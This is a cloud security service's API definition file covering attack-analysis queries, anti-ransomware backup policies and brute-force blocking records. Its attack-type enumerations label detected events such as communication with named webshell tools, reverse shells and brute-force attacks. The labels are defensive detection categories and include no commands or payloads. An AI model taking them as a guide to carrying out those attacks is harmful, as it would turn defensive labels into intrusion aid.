  base64?: string(name='Base64', description='Specifies whether to encode the value of the **client_url** field in the query results by using the Base64 algorithm. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**.

>  If the Type parameter is set to **DETAILS**, you must specify the CurrentPage parameter.', example='1', position='Query'),
  data?: string(name='Data', description='The condition that is used to filter attack events.

>  The following list describes the valid values of crack_type:

*   3: brute-force attack on MySQL

*   4: FTP brute-force attack

*   5: SSH brute-force attack

*   6: RDP brute-force attack

*   9: brute-force attack on Microsoft SQL Server

*   101: intercepted attack on Java Struts 2

*   102: intercepted attack on Redis

*   103: communication with AntSword Webshell

*   104: communication with China Chopper Webshell

*   133: communication with XISE Webshell

*   sqli: SQL injection

*   codei: code execution

*   xss: cross-site scripting (XSS)

*   lfi: local file inclusion

*   rfi: remote file inclusion

*   webshell: trojan script

*   upload: vulnerability upload

*   path: directory traversal

*   bypass: unauthorized access

*   csrf: cross-site request forgery (CSRF)

*   crlf: carriage return line feed (CRLF)

*   other: others', example='{"crack_type":"9"}', position='Query'),
  endTime: long(name='EndTime', description='The timestamp when the attack stops. Unit: seconds.', example='1649040221', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

>  If the Type parameter is set to **DETAILS**, you must specify the PageSize parameter.', example='10', position='Query'),
  startTime: long(name='StartTime', description='The timestamp at which the attack starts. By default, the statistics of the previous seven days are queried. Unit: seconds.

>  The start time that you specify must be within the previous 40 days.', example='1644027670', position='Query'),
  type: string(name='Type', description='The details of attack analysis. Valid values:

*   **TOTAL**: number of attacks
*   **TREND**: attack trend
*   **PIE_CHART**: distribution of attacks by type
*   **SOURCE_TOP**: top 5 attack sources
*   **CLIENT_TOP**: top 5 attacked assets
*   **DETAILS**: attack details

>  If the Type parameter is set to **DETAILS**, you must specify the CurrentPage and PageSize parameters.', example='DETAILS', position='Query'),
}

model DescribeAttackAnalysisDataResponseBody = {
  data?: string(name='Data', description='The attack events. The value contains the following fields:

*   **client_url**: the URL of the attack request.

*   **internetIp**: the IP address of the asset.

*   **instanceName**: the name of the asset.

*   **table_src**: the source of data.

*   **uuid**: the UUID of the asset.

*   **crack_method**: the method of the attack request.

*   **crack_hour**: the attack time.

*   **crack_src_ip**: the IP address from which the attack is launched.

*   **instanceId**: the ID of the asset.

*   **dst_port**: the attacked port.

*   **client_ip**: the attacked IP address.

*   **location**: the region from which the attack is launched.

*   **aliuid**: the ID of the Alibaba Cloud account.

*   **crack_cnt**: the number of times that the attack is launched.

*   **crack_type**: the type of the attack. Valid values:

    *   **113**: improper authorization
    *   **112**: redirection attack
    *   **upload**: vulnerability upload
    *   **other**: others
    *   **webshell**: trojan script
    *   **201**: suspicious connection
    *   **9**: brute-force attack on Microsoft SQL Server
    *   **5**: SSH brute-force attack
    *   **6**: RDP brute-force attack
    *   **lfi**: local file inclusion
    *   **7**: code execution
    *   **sqli**: SQL injection
    *   **209**: web attack
    *   **31**: buffer overflow
    *   **3**: brute-force attack on MySQL
    *   **30**: clickjacking
    *   **4**: FTP brute-force attack
    *   **bypass**: unauthorized access
    *   **33**: format string
    *   **deeplearning**: others
    *   **32**: integer overflow
    *   **203**: brute-force attack
    *   **34**: race condition
    *   **rfi**: remote file inclusion
    *   **0**: SQL injection
    *   **212**: mining behavior
    *   **213**: reverse shell
    *   **211**: worm
    *   **61**: session timeout
    *   **20**: directory traversal
    *   **xss**: XSS
    *   **22**: unauthorized access
    *   **21**: scan attack
    *   **24**: file modification
    *   **26**: file deletion
    *   **25**: file reading
    *   **28**: CRLF injection
    *   **27**: logic error
    *   **29**: template injection
    *   **csrf**: CSRF
    *   **path**: directory traversal
    *   **crlf**: CRLF
    *   **102**: CSRF
    *   **103**: server-side request forgery (SSRF)
    *   **101**: XSS
    *   **11**: file inclusion
    *   **10**: file upload
    *   **12**: vulnerability upload
    *   **15**: unauthorized access
    *   **14**: information leakage
    *   **17**: XML entity injection
    *   **16**: insecure configuration
    *   **19**: Lightweight Directory Access Protocol (LDAP) injection
    *   **18**: XPath injection
    *   **codei**: code execution', example='[{\\"crack_hour\\":1662480000000,\\"crack_cnt\\":471},{\\"crack_hour\\":1662483600000,\\"crack_cnt\\":461},{\\"crack_hour\\":1662487200000,\\"crack_cnt\\":445},{\\"crack_hour\\":1662490800000,\\"crack_cnt\\":471},{\\"crack_hour\\":1662494400000,\\"crack_cnt\\":534},{\\"crack_hour\\":1662498000000,\\"crack_cnt\\":652},{\\"crack_hour\\":1662501600000,\\"crack_cnt\\":706},{\\"crack_hour\\":1662505200000,\\"crack_cnt\\":613},{\\"crack_hour\\":1662508800000,\\"crack_cnt\\":578},{\\"crack_hour\\":1662512400000,\\"crack_cnt\\":577},{\\"crack_hour\\":1662516000000,\\"crack_cnt\\":616},{\\"crack_hour\\":1662519600000,\\"crack_cnt\\":597},{\\"crack_hour\\":1662523200000,\\"crack_cnt\\":575},{\\"crack_hour\\":1662526800000,\\"crack_cnt\\":507}]'),
  page?: int32(name='Page', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032756C'),
  total?: int32(name='Total', description='The total number of attack events returned.', example='1000'),
}

model DescribeAttackAnalysisDataResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAttackAnalysisDataResponseBody(name='body'),
}

async function describeAttackAnalysisData(request: DescribeAttackAnalysisDataRequest): DescribeAttackAnalysisDataResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAttackAnalysisData', 'POST', '/', 'json', false, 'json', request);
}

model DescribeAutoDelConfigRequest {
}

model DescribeAutoDelConfigResponseBody = {
  days?: int32(name='Days', description='The number of days during which a detected vulnerability is retained before the vulnerability is automatically deleted.', example='30'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C56F66FD-C4EE-4813-ABDC-4FF94B6C384E'),
}

model DescribeAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAutoDelConfigResponseBody(name='body'),
}

async function describeAutoDelConfig(request: DescribeAutoDelConfigRequest): DescribeAutoDelConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeAutoDelConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackUpExportInfoRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  exportType: string(name='ExportType', description='The type of archived information. Valid values:

*   **suspiciousExport**: alert event', example='suspiciousExport', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
}

model DescribeBackUpExportInfoResponseBody = {
  data?: [ 
    {
      currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='29'),
      fileName?: string(name='FileName', description='The name of the file.', example='suspicious_event_20221203'),
      gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='1671607025000'),
      id?: long(name='Id', description='The ID of the export task.', example='273698***'),
      link?: string(name='Link', description='The URL at which you can download the archived information.', example='http://xxx.oss-cn-xxx.aliyuncs.com/export/assetInstance_20221221_1671606250570.zip'),
      message?: string(name='Message', description='The error message that is returned when the export task fails.', example='success'),
      progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
      status?: string(name='Status', description='The status of the export task. Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
      totalCount?: int32(name='TotalCount', description='The total number of entries in the file.', example='29'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='29'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackUpExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackUpExportInfoResponseBody(name='body'),
}

async function describeBackUpExportInfo(request: DescribeBackUpExportInfoRequest): DescribeBackUpExportInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackUpExportInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackupClientsRequest {
  supportRegionId: string(name='SupportRegionId', description='The region in which the anti-ransomware feature is supported.
> You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='cn-hangzhou', position='Query'),
}

model DescribeBackupClientsResponseBody = {
  clients?: [ 
    {
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000az2f537r73dyh****'),
      clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent.

Valid values:

*   **INSTALLING**: The agent is being installed.
*   **ONLINE**: The agent is online.
*   **UNINSTALLING**: The agent is being uninstalled.
*   **NOT_INSTALLED**: The agent is not installed.
*   **ACTIVATED**: The agent is enabled.
*   **CLIENT\\_CONNECTION_ERROR**: A connection error occurs on the agent.', example='ONLINE'),
      clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.0.0'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance on which the anti-ransomware agent is installed.', example='i-bp15hyph4aci99dv****'),
      uuid?: string(name='Uuid', description='The UUID of the Elastic Compute Service (ECS) instance on which the anti-ransomware agent is installed.', example='22f6550d-f294-449b-b6e6-90638fd1****'),
    }
  ](name='Clients', description='An array that consists of the information about the anti-ransomware agent.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E3ED094C-9EB7-4239-962B-D0FB3D5F23C7'),
}

model DescribeBackupClientsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupClientsResponseBody(name='body'),
}

/**
  * You can call the DescribeBackupClients operation to query the servers on which the anti-ransomware agent is installed in a specified region.
  *
 */
async function describeBackupClients(request: DescribeBackupClientsRequest): DescribeBackupClientsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackupClients', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackupFilesRequest {
  currentPage: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  pageSize: string(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  path?: string(name='Path', description='The path to the backup file.', example='“”', position='Query'),
  snapshotHash: string(name='SnapshotHash', description='The hash value of the backup file.', example='a7f26223ef3974c6fac324cd37713ab65ab618859d20b4039192a5da44d77b63', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server to which an anti-ransomware policy is applied.', example='6d5b361f-958d-48a8-a9d2-d6e82c1a****', position='Query'),
}

model DescribeBackupFilesResponseBody = {
  backupFiles?: [ 
    {
      name?: string(name='Name', description='The name of the anti-ransomware policy.', example='Group 1'),
      size?: long(name='Size', description='The size of the backup file. Unit: bytes.', example='100'),
      subtree?: string(name='Subtree', description='The path to the subdirectory of the backup file.', example='Python27\\'),
      type?: string(name='Type', description='The type of the protected file. Valid values:

*   **file**: files
*   **dir**: folders', example='dir'),
    }
  ](name='BackupFiles', description='An array that consists of the backup files returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of backup files returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of backup files returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='00A60A6D-33E0-5D5A-9B7C-E5D4DCA88148'),
}

model DescribeBackupFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupFilesResponseBody(name='body'),
}

async function describeBackupFiles(request: DescribeBackupFilesRequest): DescribeBackupFilesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackupFiles', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackupMachineStatusRequest {
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeBackupPolicy](~~DescribeBackupPolicy~~) operation to query the UUIDs of servers.', example='eb2c782e-64f2-4590-a86c-d90164df****', position='Query'),
}

model DescribeBackupMachineStatusResponseBody = {
  backupMachineStatus?: {
    clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000dbefaw9f7gnbw****'),
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **ONLINE**: normal
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **UNINSTALLING**: being uninstalled
*   **UNINSTALL_FAILED**: failed to be uninstalled
*   **UPGRADING**: being upgraded
*   **UPGRADE_FAILED**: failed to be upgraded', example='ONLINE'),
    clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.11.0'),
    errorCode?: string(name='ErrorCode', description='The error code returned.', example='CLIENT_CONNECTION_ERROR'),
    errorList?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The error code returned.', example='TARGET_NOT_EXIST'),
        errorStatus?: string(name='ErrorStatus', description='The error message returned.', example='FAILED'),
      }
    ](name='ErrorList', description='An array that consists of the error information reported by the backup server.'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-2zeaqkb80vloxjcj****'),
    regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shenzhen'),
    savedBackupCount?: int32(name='SavedBackupCount', description='The number of backup versions.', example='7'),
    status?: string(name='Status', description='The status of the anti-ransomware agent. Valid values:

*   **NOT_INSTALLED**: not installed
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **ACTIVATED**: normal', example='ACTIVATED'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
    vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-0005i2qh5fcr6seo****'),
  }(name='BackupMachineStatus', description='The backup status of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeBackupMachineStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupMachineStatusResponseBody(name='body'),
}

async function describeBackupMachineStatus(request: DescribeBackupMachineStatusRequest): DescribeBackupMachineStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackupMachineStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackupPoliciesRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  machineRemark?: string(name='MachineRemark', description='The information that you want to use to identify the servers protected by the anti-ransomware policy. You can enter the IP address or ID of a server.', example='1.1.XX.XX', position='Query'),
  name?: string(name='Name', description='The name of the anti-ransomware policy that you want to query.', example='SecurityStrategy-20200303', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='10', position='Query'),
  status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='enabled', position='Query'),
}

model DescribeBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of anti-ransomware policies returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  policies?: [ 
    {
      clientErrorCount?: int32(name='ClientErrorCount', description='The number of the servers on which the anti-ransomware agent is in an abnormal state.', example='2'),
      clientErrorUuidList?: [ string ](name='ClientErrorUuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in an **abnormal** state.'),
      clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='running'),
      healthClientCount?: int32(name='HealthClientCount', description='The number of the servers on which the anti-ransomware agent is in a normal state.', example='2'),
      healthClientUuidList?: [ string ](name='HealthClientUuidList', description='The UUIDs of the servers on which the anti-ransomware agent is in a **normal** state.'),
      id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='11'),
      name?: string(name='Name', description='The name of the anti-ransomware policy.', example='SecurityStrategy-20200303'),
      policy?: string(name='Policy', description='The configurations of the anti-ransomware policy. The value of this parameter is in the JSON format and contains the following fields:

*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that are protected. If the value of this field is \\[], all formats of files are protected.

*   **Source**: the directory that is protected. If the value of this field is \\[], all directories are protected.

*   **ExcludeSystemPath**: indicates whether a specified directory is excluded from the anti-ransomware policy. If the value of this field is **true**, the directory is excluded. If this field is left empty, no directories are excluded.

*   **Exclude**: the directory that is excluded from the anti-ransomware policy. If no directory is specified, the value of this field is \\[].

*   **Schedule**: the start time and interval of a data backup task. A start time that begins during off-peak hours but does not start on the hour is recommended. Examples:

    *   If the value of this field is I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If the value of this field is I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If the value of this field is 7, backup data is retained for a week. If the value of this field is 365, backup data is retained for a year. If the value of this field is -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If the value of this field is 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: indicates whether the VSS feature is enabled. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='{"Exclude":["/bin/","/usr/bin/","/sbin/","/boot/","/proc/","/sys/","/srv/","/lib/","/selinux/","/usr/sbin/","/run/","/lib32/","/lib64/","/lost+found/","/var/lib/kubelet/","/var/lib/ntp/proc","/var/lib/container","Windows\\\\","Python27\\\\","Program Files (x86)\\\\","Program Files\\\\","Boot\\\\","$RECYCLE.BIN","System Volume Information\\\\","Users\\\\Administrator\\\\NTUSER.DAT*","ProgramData\\\\","pagefile.sys","Users\\\\Default\\\\NTUSER.DAT*","Users\\\\Administrator\\\\ntuser.*"],"ExcludeSystemPath":true,"Include":[],"IsDefault":1,"Retention":7,"Schedule":"I|1630689360|PT24H","Source":[],"SpeedLimiter":"","UseVss":true}'),
      policyRegionId?: string(name='PolicyRegionId', description='The ID of the region that you specified for data backup when you installed the anti-ransomware agent for the server not deployed on Alibaba Cloud.', example='ch-hangzhou'),
      policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   1.0.0
*   2.0.0', example='2.0.0'),
      remarkedUuidList?: [ string ](name='RemarkedUuidList', description='The UUIDs that are returned based on the value of the MachineRemark request parameter.'),
      serverType?: string(name='ServerType', description='The type of the server. Valid values:

*   **OUT_CLOUD**: server not deployed on Alibaba Cloud
*   **ALIYUN**: Elastic Compute Service (ECS) instance
*   **TRIPARTITE**: simple application server', example='OUT_CLOUD'),
      serviceErrorCount?: int32(name='ServiceErrorCount', description='The number of servers on which data backup is exceptional.', example='2'),
      serviceErrorUuidList?: [ string ](name='ServiceErrorUuidList', description='The UUIDs of the servers on which data backup is exceptional.'),
      status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='enabled'),
      upgradeStatus?: string(name='UpgradeStatus', description='The upgrade status of the anti-ransomware policy. Valid values:

*   **NotUpgraded**
*   **Upgrading**
*   **UpgradeFailed**
*   **UpgradeSuccess**', example='Upgrading'),
      uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.'),
    }
  ](name='Policies', description='An array that consists of the anti-ransomware policies returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPoliciesResponseBody(name='body'),
}

async function describeBackupPolicies(request: DescribeBackupPoliciesRequest): DescribeBackupPoliciesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackupPolicies', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackupPolicyRequest {
  id: long(name='Id', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='51880', position='Query'),
}

model DescribeBackupPolicyResponseBody = {
  backupPolicyDetail?: {
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **running**: normal
*   **exception**: abnormal', example='running'),
    id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='51880'),
    name?: string(name='Name', description='The name of the anti-ransomware policy.', example='testBuckUp'),
    policy?: string(name='Policy', description='*   **IsDefault**: the type of the anti-ransomware policy. Valid values:

    *   **1**: recommended policy
    *   **0**: custom policy

*   **Include**: the format of the files that you want to protect. If you want to protect the files in all formats, set this field to \\[].

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to \\[].

*   **ExcludeSystemPath**: specifies whether to exclude a specific directory from the anti-ransomware policy. If you want to exclude a directory, set this field to **true**. If you do not want to exclude a directory, leave this field empty.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. If you do not want to exclude a directory, set this field to \\[].

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour. Examples:

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is run at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: days. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 0:24:30720, the maximum bandwidth for a data backup task is 30 MB/s from 00:00 to 24:00.

*   **UseVss**: specifies whether to enable the VSS feature. The feature is available only for Windows servers. Valid values:

    *   **true**: yes
    *   **false**: no

>  The VSS feature is available only if you create the anti-ransomware policy for Windows servers. After you enable the feature, the number of backup failures due to running processes is significantly reduced. We recommend that you enable the VSS feature. After you enable the feature, the data of disks that are in the exFAT and FAT32 formats cannot be backed up.', example='{
      "Exclude": [
            "/bin/",
            "/usr/bin/",
            "/sbin/",
            "/boot/",
            "/proc/",
            "/sys/",
            "/srv/",
            "/lib/",
            "/selinux/",
            "/usr/sbin/",
            "/run/",
            "/lib32/",
            "/lib64/",
            "/lost+found/",
            "/var/lib/kubelet/",
            "/var/lib/ntp/proc",
            "/var/lib/container",
            "Windows\\\\",
            "Python27\\\\",
            "Program Files (x86)\\\\",
            "Program Files\\\\",
            "Boot\\\\",
            "$RECYCLE.BIN",
            "System Volume Information\\\\",
            "Users\\\\Administrator\\\\NTUSER.DAT*",
            "ProgramData\\\\",
            "pagefile.sys",
            "Users\\\\Default\\\\NTUSER.DAT*",
            "Users\\\\Administrator\\\\ntuser.*"
      ],
      "ExcludeSystemPath": true,
      "Include": [],
      "IsDefault": 1,
      "Retention": 7,
      "Schedule": "I|1630689360|PT24H",
      "Source": [],
      "SpeedLimiter": "",
      "UseVss": true
}'),
    policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy.

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
    regionId?: string(name='RegionId', description='The ID of the region in which backup data is stored.', example='cn-beijing'),
    status?: string(name='Status', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**: The anti-ransomware policy is manually enabled.
*   **disabled**: The anti-ransomware policy is manually disabled. After an anti-ransomware policy is disabled, the data backup task that is running based on the policy stops.
*   **closed**: The anti-ransomware policy automatically stops because the anti-ransomware capacity is insufficient.', example='closed'),
    uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of the servers to which the anti-ransomware policy is applied.'),
  }(name='BackupPolicyDetail', description='The details of the anti-ransomware policy.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPolicyResponseBody(name='body'),
}

async function describeBackupPolicy(request: DescribeBackupPolicyRequest): DescribeBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBackupRestoreCountRequest {
}

model DescribeBackupRestoreCountResponseBody = {
  backupRestoreCount?: {
    recovering?: int32(name='Recovering', description='The number of the restoration tasks that are in the **being restored** state.', example='3'),
    total?: int32(name='Total', description='The total number of the restoration tasks that you create.', example='30'),
  }(name='BackupRestoreCount', description='The statistics of restoration tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeBackupRestoreCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupRestoreCountResponseBody(name='body'),
}

/**
  * If you have created restoration tasks, you can call this operation to query the number of restoration tasks that are in the **restored** or **being restored** state.
  *
 */
async function describeBackupRestoreCount(request: DescribeBackupRestoreCountRequest): DescribeBackupRestoreCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBackupRestoreCount', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBruteForceRecordsRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is blocked.', example='175.106.XX.XX', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page. We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1', position='Query'),
}

model DescribeBruteForceRecordsResponseBody = {
  machineList?: [ 
    {
      aliNetOnline?: boolean(name='AliNetOnline', description='The status of the host network extension. Valid values:

*   **true**: online
*   **false**: offline', example='false'),
      blockExpireDate?: long(name='BlockExpireDate', description='The timestamp when the block action on the IP address becomes invalid.', example='1671506882063'),
      blockIp?: string(name='BlockIp', description='The IP address that is blocked.', example='10.12.XX.XX'),
      blockType?: string(name='BlockType', description='The blocking type. Valid values:

*   **group**: security group
*   **alinet**: host network extension', example='alinet'),
      errorCode?: string(name='ErrorCode', description='The error code returned when the defense rule fails to block the IP address.', example='InstanceSecurityGroupLimitExceeded'),
      id?: long(name='Id', description='The ID of the primary key that is recorded in the defense rule.', example='112XX'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='record-test-***'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='192.168.XX.XX'),
      port?: string(name='Port', description='The port that is attacked.', example='22/22'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='AntiRuleName'),
      source?: string(name='Source', description='The type of the defense rule. Valid values:

*   **userRule**: custom rule
*   **blinkRule**: system rule', example='userRule'),
      status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the defense rule takes effect.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
    }
  ](name='MachineList', description='The IP addresses.'),
